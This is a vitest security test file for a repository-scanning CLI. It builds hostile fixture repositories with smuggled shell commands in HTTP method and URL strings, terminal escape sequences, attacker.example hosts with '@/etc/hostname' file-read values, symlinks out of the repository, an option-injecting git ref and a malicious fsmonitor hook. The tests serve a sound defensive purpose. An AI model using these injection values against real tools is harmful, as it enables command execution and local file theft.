import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, symlinkSync, writeFileSync } from "node:fs";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { cli, removeTempDirs, scanJson, schemaErrors, tempRepo } from "./helpers.js";

afterAll(removeTempDirs);

const posix = process.platform !== "win32";

/** Code a hostile repository could contain: every string here is chosen to break out of the report. */
function hostileRepo(marker: string): string {
  return tempRepo({
    "src/inject.ts": [
      `export const a = () => fetch("https://api.example.com/a", { method: "GET\\ntouch ${marker}-method #" });`,
      `export const b = () => fetch("https://api.example.com/b\\n touch ${marker}-path", { method: "POST", body: "x" });`,
      `export const c = () => fetch("https://api.example.com/\\u001b]0;title\\u0007\\u001b[2Jc");`,
      `export const d = () => fetch("https://api.example.com/d", { method: "GET;touch${"${IFS}"}${marker}-semi" });`,
    ].join("\n"),
    "src/upload.ts": [
      `import OpenAI from "openai";`,
      `const client = new OpenAI({ baseURL: "https://attacker.example/v1" });`,
      `export const multipart = () => client.files.create({ file: "@/etc/hostname", purpose: "<notes.txt" });`,
      `export const raw = () => fetch("https://attacker.example/raw", { method: "POST", body: "@/etc/hostname" });`,
    ].join("\n"),
  });
}

describe("output a hostile repository chooses", () => {
  const marker = path.join(tempRepo({}), "pwned");
  const repo = hostileRepo(marker);

  it.skipIf(!posix)("curl output runs as a script without running anything but curl", () => {
    const bin = tempRepo({ curl: "#!/bin/sh\nexit 0\n" });
    chmodSync(path.join(bin, "curl"), 0o755);
    const run = cli(["scan", repo, "--curl"]);
    expect(run.status).not.toBe(1);
    const script = run.stdout;
    const r = spawnSync("sh", ["-c", script], { env: { PATH: `${bin}:/usr/bin:/bin` }, encoding: "utf8" });
    for (const suffix of ["-method", "-path", "-semi"]) expect(existsSync(`${marker}${suffix}`), suffix).toBe(false);
    expect(r.stderr).toBe("");
    expect(r.status).toBe(0);
  });

  it("never prints control characters to the terminal", () => {
    for (const args of [[], ["--curl"]]) {
      const r = cli(["scan", repo, ...args]);
      expect(r.status).toBe(0);
      expect(r.stdout).toContain("\\u001b]0;title\\u0007");
      // eslint-disable-next-line no-control-regex -- the assertion is about control characters
      expect(`${r.stdout}${r.stderr}`).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
    }
  });

  it("makes curl send values as written, never read local files", () => {
    const script = cli(["scan", repo, "--curl"]).stdout;
    expect(script).toContain("--form-string 'file=@/etc/hostname'");
    expect(script).toContain("--form-string 'purpose=<notes.txt'");
    expect(script).toMatch(/curl -X POST 'https:\/\/attacker\.example\/raw'[^#]*--data-raw '/);
    expect(script).not.toMatch(/(^|\s)(-F|--form|--data-binary|-d) /m);
  });

  it("reports odd keys and hosts instead of failing", () => {
    const { run, report } = scanJson(
      tempRepo({
        "src/odd-keys.ts": [
          `export const k = () => fetch("https://constructor/x");`,
          `export const p = () => fetch("https://api.example.com/p?constructor=1", { method: "POST", body: JSON.stringify({ constructor: 1, __proto__: { x: 1 }, ok: 2 }) });`,
        ].join("\n"),
      }),
    );
    expect(run.status).toBe(0);
    expect(schemaErrors(report)).toEqual([]);
    expect(report.calls.filter((c) => c.location.file === "src/odd-keys.ts").map((c) => c.provider)).toEqual(["unknown", "api.example.com"]);
  });
});

describe("credentials written in the code", () => {
  it("keeps credentials out of every output", () => {
    const repo = tempRepo({
      "src/secrets.ts": [
        `export const s = () => fetch("https://admin:hunter2@api.example.com/v1/users?token=plainTok3n&page=2", {`,
        `  method: "POST",`,
        `  body: JSON.stringify({ password: "SuperSecret123", nested: { client_secret: "cs_abcdef" }, note: "kept" }),`,
        `});`,
      ].join("\n"),
    });
    for (const args of [["--json"], ["--curl"], []]) {
      const out = cli(["scan", repo, ...args]).stdout;
      for (const secret of ["hunter2", "plainTok3n", "SuperSecret123", "cs_abcdef"]) expect(out, `${args.join(" ")} ${secret}`).not.toContain(secret);
      expect(out).toContain("api.example.com");
    }
    const call = scanJson(repo).report.calls[0]!;
    expect(call).toMatchObject({ host: "api.example.com", query: ["token", "page"], body: { properties: { note: { enum: ["kept"] } } } });
  });
});

describe.skipIf(!posix)("files a hostile repository links to", () => {
  it("does not read devices or files outside the scanned directory", () => {
    const outside = tempRepo({ "secret.ts": `export const leak = () => fetch("https://outside.example/leak");` });
    const repo = tempRepo({ "src/main.ts": `export const ok = () => fetch("https://inside.example/ok");` });
    for (const name of ["package.json", ".env.example", "tsconfig.json"]) symlinkSync("/dev/zero", path.join(repo, name));
    symlinkSync(path.join(outside, "secret.ts"), path.join(repo, "src", "leak.ts"));
    const started = Date.now();
    const { run, report } = scanJson(repo);
    expect(Date.now() - started).toBeLessThan(60_000);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => c.host)).toEqual(["inside.example"]);
  });

  it("does the same for Python sources and manifests", () => {
    const outside = tempRepo({ "secret.py": `import requests\nrequests.get("https://outside.example/leak")\n` });
    const repo = tempRepo({ "app/main.py": `import requests\nrequests.get("https://inside.example/ok")\n` });
    for (const name of ["requirements.txt", "pyproject.toml", "setup.py"]) symlinkSync("/dev/zero", path.join(repo, name));
    symlinkSync(path.join(outside, "secret.py"), path.join(repo, "app", "leak.py"));
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => c.host)).toEqual(["inside.example"]);
  });

  it("does the same for Go sources and go.mod", () => {
    const outside = tempRepo({ "secret.go": `package main\n\nimport "net/http"\n\nfunc leak() { http.Get("https://outside.example/leak") }\n` });
    const repo = tempRepo({ "cmd/app/main.go": `package main\n\nimport "net/http"\n\nfunc main() { http.Get("https://inside.example/ok") }\n` });
    symlinkSync("/dev/zero", path.join(repo, "go.mod"));
    symlinkSync(path.join(outside, "secret.go"), path.join(repo, "cmd", "app", "leak.go"));
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => [c.host, c.location.language])).toEqual([["inside.example", "go"]]);
  });

  it("takes no env hint from a .env.example that links out of the repository", () => {
    const outside = tempRepo({ ".env": "API_URL=https://internal.corp.example\n" });
    const repo = tempRepo({ "api.ts": "export const a = () => fetch(`${process.env.API_URL}/v1/x`);\n" });
    symlinkSync(path.join(outside, ".env"), path.join(repo, ".env.example"));
    expect(scanJson(repo).report.calls[0]).toMatchObject({ hostKind: "env", envName: "API_URL", provider: "env:API_URL" });
  });

  it("skips a file the parser cannot load and still reports the others", () => {
    const deep = `export const x = ${"(".repeat(20_000)}1${")".repeat(20_000)};\n`;
    const repo = tempRepo({ "deep.ts": deep, "ok.ts": `export const ok = () => fetch("https://api.github.com/meta");` });
    for (const args of [[], ["--exclude", "nothing.ts"]]) {
      const { run, report } = scanJson(repo, args);
      expect(run.status).toBe(2);
      expect(report.calls.map((c) => c.provider)).toEqual(["github"]);
      expect(report.diagnostics).toMatchObject({ filesSeen: 2, filesScanned: 1, skipped: [{ file: "deep.ts", reason: "parse-error" }] });
    }
  });
});

describe.skipIf(!posix)("shell scripts a hostile repository links to", () => {
  it("reads no script, sourced file or data file outside the repository, and no FIFO", () => {
    const outside = tempRepo({
      "secret.sh": "curl https://outside.example/leak\n",
      "env.sh": 'API="https://outside.example/v1"\n',
      "body.json": '{"secret": "value"}\n',
    });
    const repo = tempRepo({ "bin/ok.sh": '. ./env.sh\nsource ./zero.sh\ncurl -d @body.json "${API:-https://inside.example}/ok"\n' });
    symlinkSync(path.join(outside, "secret.sh"), path.join(repo, "bin", "leak.sh"));
    symlinkSync(path.join(outside, "env.sh"), path.join(repo, "bin", "env.sh"));
    symlinkSync(path.join(outside, "body.json"), path.join(repo, "bin", "body.json"));
    symlinkSync("/dev/zero", path.join(repo, "bin", "zero.sh"));
    // an extension-less file that is a FIFO is never opened to read its `#!` line
    if (spawnSync("mkfifo", [path.join(repo, "bin", "pipe")]).status !== 0) throw new Error("mkfifo failed");
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => [c.host, c.location.language, c.body])).toEqual([["inside.example", "shell", { type: "unknown" }]]);
  });
});

describe.skipIf(!posix)("Rust files a hostile repository links to", () => {
  it("does the same for Rust sources and Cargo.toml", () => {
    const outside = tempRepo({ "secret.rs": `pub fn leak() { let _ = reqwest::blocking::get("https://outside.example/leak"); }\n` });
    const repo = tempRepo({ "src/main.rs": `mod leak;\nfn main() { let _ = reqwest::blocking::get("https://inside.example/ok"); }\n` });
    symlinkSync("/dev/zero", path.join(repo, "Cargo.toml"));
    symlinkSync(path.join(outside, "secret.rs"), path.join(repo, "src", "leak.rs"));
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => [c.host, c.location.language])).toEqual([["inside.example", "rust"]]);
  });
});

describe.skipIf(!posix)("Dart files a hostile repository links to", () => {
  it("does the same for Dart sources, their imports and pubspec.yaml", () => {
    const outside = tempRepo({ "secret.dart": `import 'package:http/http.dart' as http;\nvoid leak() => http.get(Uri.parse('https://outside.example/leak'));\n` });
    const repo = tempRepo({
      "lib/main.dart": `import 'package:http/http.dart' as http;\nimport 'leak.dart';\nimport '../../../../../../../etc/passwd.dart';\nvoid main() => http.get(Uri.parse('https://inside.example/ok'));\n`,
    });
    symlinkSync("/dev/zero", path.join(repo, "pubspec.yaml"));
    symlinkSync(path.join(outside, "secret.dart"), path.join(repo, "lib", "leak.dart"));
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => [c.host, c.location.language])).toEqual([["inside.example", "dart"]]);
  });
});

describe.skipIf(!posix)("WSDL files a hostile repository links to (#58)", () => {
  it("reads no WSDL that links out of the repository or to a device", () => {
    const outside = tempRepo({ "x.wsdl": `<definitions><soap:address location="https://internal.corp.example/soap"/></definitions>` });
    const repo = tempRepo({
      "app/a.php": `<?php\n$c = new SoapClient(__DIR__ . '/leak.wsdl');\n$c->Track([]);\n$d = new SoapClient(__DIR__ . '/zero.wsdl');\n$d->Track([]);\n`,
    });
    symlinkSync(path.join(outside, "x.wsdl"), path.join(repo, "app", "leak.wsdl"));
    symlinkSync("/dev/zero", path.join(repo, "app", "zero.wsdl"));
    const { run, report } = scanJson(repo);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => [c.hostKind, c.operation?.name])).toEqual([
      ["unknown", "Track"],
      ["unknown", "Track"],
    ]);
  });
});

describe.skipIf(!posix)("git", () => {
  it("rejects a ref that is an option and never runs the repository's fsmonitor", () => {
    const repo = tempRepo({ "a.ts": `export const a = () => fetch("https://api.github.com/meta");` });
    const marker = path.join(repo, "fsmonitor-ran");
    spawnSync("git", ["init", "-q"], { cwd: repo });
    spawnSync("git", ["-c", "user.name=e2e", "-c", "user.email=e2e@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "init"], { cwd: repo });
    writeFileSync(path.join(repo, "hook.sh"), `#!/bin/sh\ntouch '${marker}'\nexit 1\n`);
    chmodSync(path.join(repo, "hook.sh"), 0o755);
    spawnSync("git", ["config", "core.fsmonitor", path.join(repo, "hook.sh")], { cwd: repo });
    const out = path.join(repo, "written-by-git");
    const injected = cli(["scan", repo, `--changed-since=--output=${out}`]);
    expect(injected.status).toBe(1);
    expect(injected.stderr).toContain("invalid git ref");
    expect(existsSync(out)).toBe(false);
    expect(cli(["scan", repo, "--changed-since", "HEAD", "--json"]).status).toBe(0);
    expect(existsSync(marker)).toBe(false);
  });
});
